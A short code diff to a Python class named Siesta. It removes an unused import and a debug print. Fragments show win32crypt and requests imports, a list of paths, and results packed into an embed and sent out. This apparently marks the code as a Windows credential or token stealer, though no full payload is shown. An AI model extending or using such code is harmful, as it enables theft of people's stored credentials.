@@ -1,4 +1,3 @@
-from email.mime import base
 import os
 import requests
 import win32crypt
@@ -80,9 +79,6 @@ class Siesta:
                     }
                     embed[0]["fields"].append(field)
                 Siesta.sendEmbed(embed)
-                
-            else: 
-                print(path)
         return
     def getPaths():
         return {
